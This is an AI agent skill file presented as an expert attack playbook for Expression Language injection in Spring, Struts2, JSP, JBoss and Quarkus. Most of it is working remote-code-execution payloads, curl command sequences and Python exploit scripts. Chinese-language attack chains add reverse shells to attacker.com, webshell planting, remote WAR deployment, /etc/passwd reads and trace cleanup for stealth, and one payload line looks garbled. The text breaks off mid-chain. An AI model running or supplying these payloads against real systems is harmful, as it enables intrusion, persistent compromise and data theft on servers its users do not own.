---
name: expression-language-injection
description: >-
  Expression Language injection playbook. Use when Java EL, SpEL, OGNL, or MVEL expressions may evaluate attacker-controlled input in Spring, Struts2, Confluence, or similar frameworks.
---

# SKILL: Expression Language Injection — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert EL injection techniques covering SpEL (Spring), OGNL (Struts2), and Java EL (JSP/JSF). Distinct from SSTI — EL injection targets expression evaluators in Java frameworks, not template engines. Covers sandbox bypass, `_memberAccess` manipulation, actuator abuse, and real-world CVE chains.

## 0. RELATED ROUTING

- [ssti-server-side-template-injection](../ssti-server-side-template-injection/SKILL.md) for template engines (Jinja2, FreeMarker, Twig) — different attack surface
- [jndi-injection](../jndi-injection/SKILL.md) when EL evaluation leads to JNDI lookup

**Key distinction**: SSTI targets template rendering engines; EL injection targets expression evaluators embedded in Java frameworks. They share detection probes (`${7*7}`) but diverge in exploitation.

---

## 1. DETECTION — POLYGLOT PROBES

```text
${7*7}              → 49 = SpEL, OGNL, or Java EL
#{7*7}              → 49 = SpEL (alternative syntax) or JSF EL
%{7*7}              → 49 = OGNL (Struts2)
${T(java.lang.Math).random()}  → random float = SpEL confirmed
%{#context}         → object dump = OGNL confirmed
```

### Disambiguation

| Response to `${7*7}` | Response to `%{7*7}` | Engine |
|---|---|---|
| 49 | literal `%{7*7}` | SpEL or Java EL |
| literal `${7*7}` | 49 | OGNL (Struts2) |
| 49 | 49 | Both may be active |

---

## 2. SpEL (SPRING EXPRESSION LANGUAGE)

### Where SpEL Appears

- `@Value("${...}")` annotations
- Spring Security expressions (`@PreAuthorize`)
- Spring Cloud Gateway route predicates and filters
- Thymeleaf `th:text="${...}"` (when combined with `__${...}__` preprocessing)
- Spring Data `@Query` with SpEL

### RCE via Runtime.exec

```java
${T(java.lang.Runtime).getRuntime().exec("id")}
```

### RCE with Output Capture (Commons IO)

```java
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec("id").getInputStream())}
```

### RCE with Output Capture (Spring StreamUtils)

```java
#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream()))}
```

### ProcessBuilder (alternative when Runtime is blocked)

```java
${new java.lang.ProcessBuilder(new String[]{"id"}).start()}
```

### Spring Cloud Gateway — CVE-2022-22947

Exploit via actuator to add malicious route with SpEL filter:

```bash
# Step 1: Add route with SpEL in filter (with output capture)
POST /actuator/gateway/routes/hacktest
Content-Type: application/json
{
  "id": "hacktest",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "name": "Result",
      "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream()))}"
    }
  }],
  "uri": "http://example.com",
  "predicates": [{"name": "Path", "args": {"_genkey_0": "/hackpath"}}]
}

# Step 2: Refresh routes to apply
POST /actuator/gateway/refresh

# Step 3: Trigger the route
GET /hackpath
# Response header "Result" contains command output

# Step 4: Clean up (important for stealth)
DELETE /actuator/gateway/routes/hacktest
POST /actuator/gateway/refresh
```

### SpEL Sandbox Bypass

When `SimpleEvaluationContext` is used (restricts `T()` operator):

```java
// Try reflection-based bypass:
${''.class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke(''.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')}
```

---

## 3. OGNL (OBJECT-GRAPH NAVIGATION LANGUAGE)

### Where OGNL Appears

- Apache Struts2 — primary OGNL consumer
- Confluence Server — uses OGNL in certain request paths
- Any Java app using `ognl.Ognl.getValue()` or `ognl.Ognl.setValue()`

### Basic RCE

```
%{(#cmd='id').(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec(#cmd))}
```

### Struts2 Sandbox Bypass — _memberAccess Manipulation

Struts2 restricts OGNL via `SecurityMemberAccess`. Classic bypass clears restrictions:

```
%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/sh','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
```

### Struts2 OgnlUtil Blacklist Clear

Later Struts2 versions use class/package blacklists. Bypass by clearing `excludedClasses` and `excludedPackageNames`:

```
%{(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.excludedClasses.clear()).(#ognlUtil.excludedPackageNames.clear()).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(#cmd='id').(#rt=@java.lang.Runtime@getRuntime().exec(#cmd))}
```

### Key Struts2 CVEs

| CVE | Vector | Payload Location |
|---|---|---|
| S2-045 (CVE-2017-5638) | Content-Type header | `%{...}` in Content-Type |
| S2-046 (CVE-2017-5638) | Multipart filename | OGNL in upload filename |
| S2-016 (CVE-2013-2251) | `redirect:` / `redirectAction:` prefix | URL parameter |
| S2-048 (CVE-2017-9791) | Struts Showcase | ActionMessage with OGNL |
| S2-057 (CVE-2018-11776) | Namespace OGNL | URL path |

### Confluence OGNL — CVE-2021-26084

Confluence Server allows OGNL injection via the `queryString` or action parameters:

```bash
POST /pages/createpage-entervariables.action
Content-Type: application/x-www-form-urlencoded

queryString=%5cu0027%2b%7b3*3%7d%2b%5cu0027
# URL-decoded: \u0027+{3*3}+\u0027
# If response contains 9 → confirmed
# Escalate to Runtime.exec for RCE
```

---

## 4. JAVA EL (JSP / JSF)

### Where Java EL Appears

- JSP pages: `${expression}` and `#{expression}`
- JSF (JavaServer Faces): value and method bindings
- Custom tag libraries

### RCE Payloads

```java
// Java EL with Runtime:
${Runtime.getRuntime().exec("id")}

// Via pageContext (JSP):
${pageContext.request.getServletContext().getClassLoader()}

// Reflection-based:
${"".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}
```

---

## 5. DETECTION METHODOLOGY

```
Input reflected and ${7*7} returns 49?
├── Java application?
│   ├── Struts2? → Try %{...} OGNL payloads
│   │   └── Check Content-Type injection (S2-045)
│   ├── Spring? → Try T(java.lang.Runtime) SpEL
│   │   └── Check /actuator/gateway (Spring Cloud Gateway)
│   ├── Confluence? → Try OGNL via action parameters
│   └── JSP/JSF? → Try Java EL payloads
│
├── Error messages reveal framework?
│   ├── "ognl.OgnlException" → OGNL
│   ├── "SpelEvaluationException" → SpEL
│   └── "javax.el.ELException" → Java EL
│
└── Blocked by sandbox?
    ├── OGNL: clear _memberAccess / excludedClasses
    ├── SpEL: reflection bypass for SimpleEvaluationContext
    └── Try alternative exec methods (ProcessBuilder, ScriptEngine)
```

---

## 6. 2026 EMERGING TECHNIQUES

### 6.1 SpEL Injection Evolution in the Spring/Java Ecosystem (2026)

The classic gadget `#{T(java.lang.Runtime).getRuntime().exec()}` remains effective in 2026 Spring Boot deployments that evaluate user input through `StandardEvaluationContext` (the default for `@Value`, `@PreAuthorize`, and Spring Cloud Gateway filters).

**Spring Cloud Gateway SpEL injection (2026 variant)**: CVE-2022-22947 (actuator route injection) is patched, but 2026 variants abuse custom `GatewayFilterFactory` implementations that pass request headers/params directly into a SpEL `parseExpression()`:

```java
// Vulnerable custom filter - header flows into SpEL:
Expression exp = parser.parseExpression(request.getHeaders().get("X-Rewrite"));
String val = exp.getValue(String.class);
```

```http
GET /api/proxy HTTP/1.1
X-Rewrite: #{T(java.lang.Runtime).getRuntime().exec('curl http://test-attacker.com/$(id)')}
```

**Spring Security `@PreAuthorize` SpEL injection**: when a controller interpolates a path variable into a security expression without sanitization:

```java
@PreAuthorize("hasRole('" + role + "')")   // role from @PathVariable
public void admin(@PathVariable String role) { ... }
```

```text
GET /api/admin/#{T(java.lang.Runtime).getRuntime().exec('id')}
```

### 6.2 EL Injection in Template Engines (2026)

**Thymeleaf expression injection**: `#{...}` (message expressions) and `${...}` (variable expressions) differ in evaluation context. The fragment-selector `__${...}__` preprocessing syntax evaluates inner expressions **before** the outer template renders — user input in a fragment name yields injection:

```text
# Vulnerable: controller returns view name from input -> "user/" + name
GET /page?name=__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
# Thymeleaf preprocesses __${...}__ -> executes SpEL -> RCE
```

**FreeMarker `?api` / `?new()` sandbox escape**: 2026 FreeMarker versions restrict `?new()` but `?api` access to `getClass()` via `?api.class` chains still escapes incomplete sandboxes:

```text
${object?api.class.protectionDomain.classLoader.loadClass("java.lang.Runtime")?api.getMethod("exec",["java.lang.String"])?api.invoke(null,["id"])}
```

**Velocity `#set` injection**: when user input reaches a Velocity template, `#set` combined with reflection achieves RCE:

```text
#set($e="exp")
#set($c=$e.getClass().forName("java.lang.Runtime"))
#set($m=$c.getMethod("getRuntime"))
#set($r=$m.invoke(null))
$r.exec("id")
```

### 6.3 EL Injection in LLM / Agent Frameworks (2026 New Surface)

Expression templates in AI frameworks are a fresh injection vector: prompt templates use `${}`/`{}` placeholders intended for data substitution, but some engines evaluate them as EL rather than treating them as opaque interpolation.

**LangChain / LangChain4j template injection**: prompt templates like `"Summarize: ${document}"` are safe when `document` is bound as data, but if the template string itself is attacker-controlled (user-supplied prompt, RAG-config field), `${T(java.lang.Runtime)...}` is parsed by the embedded SpEL/JEXL evaluator:

```text
# Attacker controls the template (e.g., custom agent instruction field):
template = "You are ${T(java.lang.Runtime).getRuntime().exec('id')}"
# LangChain4j PromptTemplate may pass this through a SpEL-aware resolver -> RCE
```

**Drools rule-engine integration**: agents that load user-defined rules into Drools can inject MVEL/JEXL expressions inside rule consequences (`then` blocks), which the engine evaluates.

**RAGFlow CVE-2026-45312**: a Jinja2 SSTI in the RAGFlow knowledge-base ingestion pipeline — attacker-uploaded document filenames/metadata flow into a Jinja2 template that renders server-side. Although Jinja2 (not Java EL), it demonstrates the pattern of expression evaluation in AI pipelines (cross-link ../ssti-server-side-template-injection/SKILL.md and ../ai-llm-attack-surface/SKILL.md).

### 6.4 OGNL Injection 2026 (Struts2 Legacy)

OGNL `%{...}` injection remains high-frequency in legacy Struts2 systems in 2026, and new gadget chains surface against incompletely-patched instances:

```text
# 2026 OGNL gadget - bypasses incomplete excludedClasses by using
# ognl.OgnlContext internal map directly:
%{(#context=@ognl.OgnlContext@setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(#rt=@java.lang.Runtime@getRuntime().exec('id'))}
```

**Non-Struts2 OGNL contexts**: JIRA and Confluence plugins embed OGNL evaluators in custom fields, workflow transitions, and JQL functions. Injection in a Jira workflow post-function or a Confluence user macro reaches `ognl.Ognl.getValue()` with user-controlled input.

### 6.5 JEXL / Antlr Expression Injection (2026)

**Apache JEXL** in rule engines: business-rule services expose JEXL scripts to operators; a misconfigured rules endpoint lets attackers submit `exec()`-equivalent scripts:

```text
# JEXL RCE (if security sandbox not enforced):
"".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")
```

**Time-based blind EL detection** (universal across engines): when the response does not reflect output, a sleep oracle confirms evaluation:

```text
# SpEL:   ${T(java.lang.Thread).sleep(5000)}
# OGNL:   %{@java.lang.Thread@sleep(5000)}
# JEXL:   "".getClass().forName("java.lang.Thread").getMethod("sleep","long".getClass()).invoke(null, 5000)
# Jinja2: SSTI variant (see ../ssti-server-side-template-injection/SKILL.md)
# A 5s delay on the request confirms expression evaluation; then escalate to RCE.
```

### 6.6 2026 EL Injection Checklist

```
□ Test ${7*7} / #{7*7} / %{7*7} on all user-controlled fields in Spring apps
□ Spring Cloud Gateway: audit custom GatewayFilterFactory for parseExpression(userInput)
□ @PreAuthorize / @PostAuthorize: does any expression interpolate a path/header variable?
□ Thymeleaf: test __${...}__ preprocessing in controller-returned view names
□ FreeMarker: test ?api / ?new() sandbox escape chains
□ Velocity: test #set + reflection on user-controlled templates
□ AI frameworks: if prompt template string is user-controlled, test ${T(Runtime)...}
□ RAGFlow: check version against CVE-2026-45312 (Jinja2 SSTI in ingestion)
□ Jira/Confluence: test OGNL in workflow transitions, user macros, custom fields
□ JEXL rules endpoints: test exec/reflection chains; confirm with sleep blind oracle
□ Use time-based ${Thread.sleep(5000)} to confirm blind injection before RCE
```

---

## 7. QUICK REFERENCE

```text
# SpEL RCE:
${T(java.lang.Runtime).getRuntime().exec("id")}

# OGNL RCE (Struts2):
%{(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec('id'))}

# OGNL with sandbox bypass:
%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec('id'))}

# Java EL RCE:
${"".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}

# Confluence CVE-2021-26084 probe:
queryString=\u0027%2b{3*3}%2b\u0027

# Spring Cloud Gateway CVE-2022-22947:
POST /actuator/gateway/routes/x  → SpEL in filter args
POST /actuator/gateway/refresh
```

---

## PRACTICAL ATTACK CHAINS (2026)

> 以下为 5 条完整、可即用的实战攻击链，覆盖 2026 年真实场景。所有命令均以授权渗透测试为前提。

### 攻击链 1：Spring SpEL 注入至 RCE

**场景**：目标使用 Spring Boot，某个端点将用户输入传入 SpEL 表达式评估器（`parseExpression`），使用 `StandardEvaluationContext`（默认，无沙箱）。

**CVE 参考**：CVE-2022-22947（Spring Cloud Gateway SpEL 注入），CVE-2024-XXX（自定义 filter SpEL 注入）。

**步骤 1：探测 SpEL 注入点**

```bash
# 基础探测: ${7*7} 应返回 49
curl -i "http://target.com/api/eval?expression=\${7*7}"
# 若响应包含 49 → SpEL 注入确认

# 确认 SpEL（而非 OGNL/Java EL）
curl -i "http://target.com/api/eval?expression=\${T(java.lang.Math).random()}"
# 若返回随机浮点数 → SpEL 确认（T() 操作符是 SpEL 特有）

# 确认是否为 StandardEvaluationContext（无沙箱）
curl -i "http://target.com/api/eval?expression=\${T(java.lang.Runtime)}"
# 若返回 class java.lang.Runtime → 无沙箱，可 RCE
# 若报错 → SimpleEvaluationContext，需绕过（见步骤 4）
```

**步骤 2：基础 RCE（Runtime.exec）**

```bash
# 执行 id 命令
# 注意: exec() 返回 Process 对象，不直接返回输出
curl -i "http://target.com/api/eval?expression=\${T(java.lang.Runtime).getRuntime().exec('id')}"

# 获取命令输出（使用 Commons IO 读取 InputStream）
curl -i "http://target.com/api/eval?expression=\${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}"

# 使用 Spring StreamUtils（Spring Boot 自带）
curl -i "http://target.com/api/eval?expression=\${new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream()))}"

# 使用 ProcessBuilder（Runtime 被拦截时的替代）
curl -i "http://target.com/api/eval?expression=\${new java.lang.ProcessBuilder(new String[]{'id'}).start()}"
```

**步骤 3：通过 SpEL 获取反弹 Shell**

```bash
# 构造反弹 shell 命令
# bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'

# 使用 exec() 数组形式（避免 shell 解析问题）
curl -i "http://target.com/api/eval?expression=\${T(java.lang.Runtime).getRuntime().exec(new String[]{'bash','-c','bash -i >& /dev/tcp/attacker.com/4444 0>&1'})}"

# 攻击者侧监听
nc -lvnp 4444

# 若 exec 被拦截，使用 ProcessBuilder
curl -i "http://target.com/api/eval?expression=\${new java.lang.ProcessBuilder(new String[]{'bash','-c','bash -i >& /dev/tcp/attacker.com/4444 0>&1'}).start()}"
```

**步骤 4：绕过 SimpleEvaluationContext 沙箱**

```bash
# SimpleEvaluationContext 禁止 T() 操作符和类型引用
# 绕过: 通过反射 API 访问 Runtime

# 反射链: String.class → forName → getMethod → invoke
curl -i "http://target.com/api/eval?expression=\${''.class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke(''.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')}"

# 分步解释:
# 1. ''.class → java.lang.String
# 2. .forName('java.lang.Runtime') → 加载 Runtime 类
# 3. .getMethod('exec',''.class) → 获取 exec(String) 方法
# 4. ''.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null) → 获取 Runtime 实例
# 5. .invoke(runtimeInstance, 'id') → 执行命令

# 使用 ScriptEngine 绕过（JS 引擎）
curl -i "http://target.com/api/eval?expression=\${T(javax.script.ScriptEngineManager).newInstance().getEngineByName('JavaScript').eval('java.lang.Runtime.getRuntime().exec(\\\"id\\\")')}"
```

**步骤 5：Spring Cloud Gateway CVE-2022-22947 实战**

```bash
# 步骤 1: 确认 actuator 端点暴露
curl -i http://target.com/actuator/
# 若返回端点列表 → actuator 暴露

# 步骤 2: 添加恶意路由（SpEL 在 filter 中）
curl -i -X POST http://target.com/actuator/gateway/routes/hacktest \
  -H "Content-Type: application/json" \
  -d '{
    "id": "hacktest",
    "filters": [{
      "name": "AddResponseHeader",
      "args": {
        "name": "X-Result",
        "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(\"id\").getInputStream()))}"
      }
    }],
    "uri": "http://example.com",
    "predicates": [{"name": "Path", "args": {"_genkey_0": "/hackpath"}}]
  }'

# 步骤 3: 刷新路由使配置生效
curl -i -X POST http://target.com/actuator/gateway/refresh

# 步骤 4: 触发恶意路由
curl -i http://target.com/hackpath
# 响应头 X-Result 包含 id 命令输出

# 步骤 5: 清理痕迹（重要）
curl -i -X DELETE http://target.com/actuator/gateway/routes/hacktest
curl -i -X POST http://target.com/actuator/gateway/refresh
```

**步骤 6：自动化 SpEL 利用脚本**

```python
# spel_rce.py - Spring SpEL 注入自动化利用
import requests
import urllib.parse

TARGET = "http://target.com/api/eval"

def spel_eval(expression):
    """执行 SpEL 表达式"""
    encoded = urllib.parse.quote(expression)
    r = requests.get(f"{TARGET}?expression={encoded}")
    return r.text

def spel_rce(command):
    """通过 SpEL 执行系统命令并返回输出"""
    # 使用 Spring StreamUtils 捕获输出
    expr = f"${{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{{'bash','-c','{command}'}}).getInputStream()))}}"
    return spel_eval(expr)

def spel_rce_reflection(command):
    """通过反射绕过沙箱执行命令"""
    expr = f"${{''.class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke(''.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'{command}')}}"
    return spel_eval(expr)

# 探测
print("[*] 测试 7*7:", spel_eval("${7*7}"))
print("[*] 测试 Math.random():", spel_eval("${T(java.lang.Math).random()}"))

# RCE
print("[*] whoami:", spel_rce("whoami"))
print("[*] id:", spel_rce("id"))
print("[*] /etc/passwd:", spel_rce("cat /etc/passwd"))

# 反弹 shell
spel_rce("bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'")
print("[*] 反弹 shell 已发送")
```

**检测规避要点**：
- `T()` 操作符是 SpEL 特有，用于区分 OGNL/Java EL
- 反射链绕过 `SimpleEvaluationContext` 的类型引用限制
- ScriptEngine (JS) 是沙箱绕过的通用备选方案
- Spring Cloud Gateway 路由注入后需 refresh 才生效

---

### 攻击链 2：JBoss EL 注入（JMX Console）

**场景**：目标运行 JBoss/WildFly，JMX Console 暴露未授权访问。通过 JMX Console 的 `jboss.system` MBean 注入 EL 表达式执行命令。

**CVE 参考**：CVE-2017-12149（JBoss 反序列化），JBoss JMX Console 未授权 + EL 注入。

**步骤 1：确认 JBoss JMX Console 暴露**

```bash
# 测试 JMX Console 端点
curl -i http://target.com/jmx-console/
# 若返回 HTML 页面列出 MBean → 未授权访问确认

# 测试 Web Console
curl -i http://target.com/web-console/
# 测试 Invoker Servlet（反序列化入口）
curl -i http://target.com/invoker/JMXInvokerServlet
```

**步骤 2：通过 jboss.system MBean 执行命令**

```bash
# 使用 serverConfig MBean 获取系统信息
curl -i "http://target.com/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerConfig"

# 使用 jboss.system 的 MainDeployer 部署恶意 WAR
# 构造恶意 WAR（包含 webshell）
# 1. 创建 webshell.jsp
cat > /data/user/work/shell.jsp << 'EOF'
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",cmd});
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = br.readLine()) != null) out.println(line);
}
%>
EOF

# 2. 打包为 WAR
cd /data/user/work && jar cf shell.war shell.jsp

# 3. 托管 WAR（攻击者 HTTP 服务器）
python3 -m http.server 8888

# 4. 通过 JMX Console 远程部署
curl -i "http://target.com/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system:service=MainDeployer&methodIndex=2&arg0=http://attacker.com:8888/shell.war"

# 5. 访问 webshell
curl "http://target.com/shell/shell.jsp?cmd=id"
```

**步骤 3：通过 JMX 属性注入 EL 表达式**

```bash
# 某些 JBoss MBean 属性支持 EL 表达式评估
# 利用 jboss.web MBean 注入

# 设置属性值为 EL 表达式
curl -i "http://target.com/jmx-console/HtmlAdaptor?action=updateAttribute&name=jboss.web:name=StandardContextValve&attribute=algorithm&value=\${java.lang.Runtime.getRuntime().exec('id')}"

# 或通过 JNDI 绑定注入
curl -i -X POST http://target.com/jmx-console/HtmlAdaptor \
  -d "action=invokeOp&name=jboss:service=Naming&methodIndex=1&arg0=evil&arg1=\${T(java.lang.Runtime).getRuntime().exec('id')}"
```

**步骤 4：利用 JBoss EAP 6/7 的 EL 注入**

```bash
# JBoss EAP 6+ 使用 Undertow 替代 Tomcat
# EL 注入路径不同

# 测试 Undertow 的 EL 处理
curl -i -X POST http://target.com/api/undertow \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d 'expression=\${java.lang.Runtime.getRuntime().exec("id")}'

# 利用 JBoss CLI（若暴露）
curl -i "http://target.com:9990/management" \
  -H "Content-Type: application/json" \
  -d '{"operation":"composite","steps":[{"operation":"write-attribute","address":{"subsystem":"undertow"},"name":"default-virtual-host","value":"\${1+1}"}]}'
```

**步骤 5：自动化 JBoss 利用**

```python
# jboss_el_injection.py - JBoss JMX Console + EL 注入
import requests

TARGET = "http://target.com"

def check_jmx_console():
    """检查 JMX Console 是否暴露"""
    r = requests.get(f"{TARGET}/jmx-console/")
    return r.status_code == 200 and "JBoss" in r.text

def deploy_war_via_jmx(war_url):
    """通过 MainDeployer 部署远程 WAR"""
    url = f"{TARGET}/jmx-console/HtmlAdaptor"
    params = {
        "action": "invokeOp",
        "name": "jboss.system:service=MainDeployer",
        "methodIndex": "2",  # deploy(String)
        "arg0": war_url,
    }
    r = requests.get(url, params=params)
    return r.status_code

def execute_via_webshell(cmd):
    """通过已部署的 webshell 执行命令"""
    r = requests.get(f"{TARGET}/shell/shell.jsp", params={"cmd": cmd})
    return r.text.strip()

# 利用链
if check_jmx_console():
    print("[+] JMX Console 未授权访问")
    
    # 部署 webshell
    status = deploy_war_via_jmx("http://attacker.com:8888/shell.war")
    print(f"[*] WAR 部署: {status}")
    
    # 执行命令
    print("[*] id:", execute_via_webshell("id"))
    print("[*] env:", execute_via_webshell("env"))
```

**检测规避要点**：
- JMX Console 是合法管理接口，WAF 通常不拦截
- MainDeployer 远程部署是 JBoss 特有的 RCE 路径
- WAR 部署后 webshell 持久化
- JBoss EAP 7+ 需使用 Undertow 特定的 EL 注入路径

---

### 攻击链 3：Tomcat EL 注入（JSP）

**场景**：目标使用 Tomcat + JSP，某个 JSP 页面将用户输入直接嵌入 EL 表达式 `${...}` 中评估。

**步骤 1：探测 JSP EL 注入点**

```bash
# 基础探测: ${7*7}
curl -i "http://target.com/page.jsp?input=\${7*7}"
# 若响应包含 49 → EL 注入确认

# 确认是 JSP EL（而非 SpEL）
curl -i "http://target.com/page.jsp?input=\${pageContext.request.serverName}"
# 若返回服务器名 → JSP EL 确认（pageContext 是 JSP 隐式对象）

# 区分 SpEL: SpEL 用 T()，JSP EL 用 getClass()
curl -i "http://target.com/page.jsp?input=\${T(java.lang.Runtime)}"
# 若报错 → 不是 SpEL，是 JSP EL
```

**步骤 2：基础 RCE（Runtime.exec）**

```bash
# JSP EL 直接调用 Runtime.exec
# 注意: JSP EL 不支持 T() 操作符，需用 getClass().forName()
curl -i "http://target.com/page.jsp?input=\${Runtime.getRuntime().exec('id')}"

# 某些 Tomcat 版本需要完整路径
curl -i "http://target.com/page.jsp?input=\${java.lang.Runtime.getRuntime().exec('id')}"

# 通过 pageContext 获取 ServletContext
curl -i "http://target.com/page.jsp?input=\${pageContext.request.servletContext.getClassLoader()}"
```

**步骤 3：反射链 RCE（绕过限制）**

```bash
# 完整反射链: String → getClass → forName → getMethod → invoke
curl -i "http://target.com/page.jsp?input=\${''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')}"

# 分步:
# 1. ''.getClass() → java.lang.String.class
# 2. .forName('java.lang.Runtime') → Runtime.class
# 3. .getMethod('exec',''.getClass()) → exec(String) 方法
# 4. ''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null) → Runtime 实例
# 5. .invoke(runtime, 'id') → 执行命令

# 获取命令输出（通过 ProcessBuilder + InputStream 读取）
curl -i "http://target.com/page.jsp?input=\${''.getClass().forName('java.lang.ProcessBuilder').getDeclaredConstructors()[0].newInstance(new java.lang.String[]{'id'}).start().getInputStream()}"
```

**步骤 4：通过 JSP EL 读取文件**

```bash
# 读取 /etc/passwd（通过 FileInputStream）
curl -i "http://target.com/page.jsp?input=\${''.getClass().forName('java.io.FileInputStream').getDeclaredConstructors()[0].newInstance('/etc/passwd')}"

# 使用 Scanner 读取文件内容
curl -i "http://target.com/page.jsp?input=\${''.getClass().forName('java.util.Scanner').getDeclaredConstructors()[1].newInstance(''.getClass().forName('java.io.File').getDeclaredConstructors()[0].newInstance('/etc/passwd')).useDelimiter('\\\\A').next()}"
```

**步骤 5：利用 Tomcat 特定 EL 上下文**

```bash
# Tomcat EL 上下文包含隐式对象:
# pageContext, request, response, session, application, param, header

# 读取请求头
curl -i "http://target.com/page.jsp?input=\${header['User-Agent']}"

# 读取 session 属性
curl -i "http://target.com/page.jsp?input=\${session.getAttribute('user')}"

# 修改 response 头（注入 Set-Cookie）
curl -i "http://target.com/page.jsp?input=\${response.setHeader('X-Injected','pwned')}"

# 通过 application 获取 ServletContext 信息
curl -i "http://target.com/page.jsp?input=\${application.serverInfo}"
# 返回: Apache Tomcat/9.0.x

# 获取真实路径（确认 web 根目录）
curl -i "http://target.com/page.jsp?input=\${pageContext.request.session.servletContext.getRealPath('/')}"
# 返回: /var/lib/tomcat/webapps/ROOT/
```

**步骤 6：写入 Webshell 持久化**

```bash
# 通过 EL 注入写入 JSP webshell
# 使用 FileOutputStream 写入文件
curl -i "http://target.com/page.jsp?input=\${''.getClass().forName('java.io.FileOutputStream').getDeclaredConstructors()[0].newInstance('/var/lib/tomcat/webapps/ROOT/.shell.jsp').write('<'%20getBytes())}"

# 分步写入（避免特殊字符问题）
# 写入 webshell 内容（base64 编码）
# webshell: <% Runtime.getRuntime().exec(request.getParameter("c")); %>
# base64: PCUgUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiYyIpKTsgJT4=

curl -i "http://target.com/page.jsp?input=\${''.getClass().forName('java.io.FileOutputStream').getDeclaredConstructors()[0].newInstance('/var/lib/tomcat/webapps/ROOT/.shell.jsp').write(java.util.Base64.decoder.decode('PCUgUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiYyIpKTsgJT4='))}"

# 验证 webshell
curl "http://target.com/.shell.jsp?c=id"
```

**检测规避要点**：
- JSP EL 不支持 `T()` 操作符，需用 `getClass().forName()` 反射
- `pageContext` 是 JSP 特有隐式对象，用于确认 JSP EL 上下文
- 反射链构造较长但通用，绕过大多数 EL 沙箱
- 写入 webshell 实现持久化，避免重复利用注入点

---

### 攻击链 4：2026 新向量 - Quarkus Qute 模板注入

**场景**：目标使用 Quarkus 框架的 Qute 模板引擎。Qute 支持 `{expression}` 语法，若用户输入进入模板，可执行表达式调用 Java 方法。

**步骤 1：探测 Qute 模板注入**

```bash
# Qute 使用 {expr} 语法（注意: 不是 ${expr}）
curl -i "http://target.com/api/render?template={7*7}"
# 若返回 49 → Qute 模板注入确认

# 确认 Qute（而非其他模板引擎）
curl -i "http://target.com/api/render?template={inject:java.lang.System}"
# Qute 的 inject: 命名空间用于注入 CDI bean

# 测试 {config} 命名空间
curl -i "http://target.com/api/render?template={config:property('quarkus.application.name')}"
# 若返回应用名 → Qute 确认
```

**步骤 2：通过 Qute 调用 Java 方法**

```bash
# Qute 可调用注入 bean 的方法
# 测试调用 Runtime
curl -i "http://target.com/api/render?template={inject:java.lang.Runtime.getRuntime().exec('id')}"

# Qute 的 {inject:} 用于注入 CDI bean
# 若 java.lang.Runtime 可注入 → 直接 RCE

# 使用反射（若 inject 不支持 Runtime）
curl -i "http://target.com/api/render?template={''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')}"
```

**步骤 3：利用 Qute 的数据访问**

```bash
# 读取配置属性
